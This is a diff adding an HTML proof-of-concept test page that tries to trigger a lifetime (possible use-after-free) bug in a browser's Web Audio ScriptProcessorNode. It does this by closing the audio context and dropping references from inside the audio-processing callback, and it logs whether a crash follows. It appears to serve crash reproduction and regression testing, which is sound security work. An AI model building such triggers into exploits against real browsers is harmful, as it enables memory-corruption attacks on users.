@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>GLM-003 ScriptProcessorNode fireProcessEvent lifetime</title></head>
+<body><pre id="log">POC STARTED: GLM-003 ScriptProcessorNode
+</pre>
+<script>
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+function log(m) { document.getElementById('log').textContent += m + '\n'; }
+let ctx, node, src, done = false, fired = 0;
+function finish() { if (done) return; done = true; log('NO CRASH OBSERVED'); log('DONE'); if (window.testRunner) testRunner.notifyDone(); }
+function teardown(label) {
+    log('PHASE: teardown ' + label);
+    try { if (node) node.disconnect(); log('ACTION: node.disconnect attempted'); } catch (e) { log('ACTION: node.disconnect threw ' + e.name); }
+    try { if (src) src.disconnect(); log('ACTION: source.disconnect attempted'); } catch (e) { log('ACTION: source.disconnect threw ' + e.name); }
+    try { if (ctx && ctx.state !== 'closed') ctx.close().catch(e => log('ACTION: close rejected ' + e.name)); log('ACTION: audioContext.close attempted'); } catch (e) { log('ACTION: close threw ' + e.name); }
+    src = null; node = null; ctx = null; log('ACTION: references dropped');
+}
+function run() {
+    log('PHASE: setup');
+    let C = window.AudioContext || window.webkitAudioContext;
+    if (!C) { log('AudioContext unavailable'); finish(); return; }
+    try {
+        ctx = new C(); log('AudioContext created');
+        node = ctx.createScriptProcessor(256, 1, 1); log('ScriptProcessorNode created');
+        let b = ctx.createBuffer(1, 1024, ctx.sampleRate), d = b.getChannelData(0);
+        for (let i = 0; i < d.length; ++i) d[i] = (i & 1) ? 0.02 : -0.02;
+        src = ctx.createBufferSource(); src.buffer = b; src.loop = true;
+        src.connect(node); node.connect(ctx.destination);
+        node.onaudioprocess = function(e) {
+            log('PHASE: onaudioprocess callback'); log('onaudioprocess fired');
+            if (++fired > 1) return;
+            try { e.outputBuffer.getChannelData(0)[0] = 0; log('ACTION: outputBuffer touched'); } catch (ex) { log('ACTION: outputBuffer touch threw ' + ex.name); }
+            teardown('inside event');
+            log('event returned');
+            setTimeout(finish, 0);
+        };
+        log('PHASE: start source'); src.start(0);
+        setTimeout(function(){ if (!fired) { log('PHASE: timeout before event'); teardown('timeout'); finish(); } }, 1200);
+    } catch (e) { log('top-level caught ' + e.name + ': ' + e.message); finish(); }
+}
+run();
+</script></body></html>
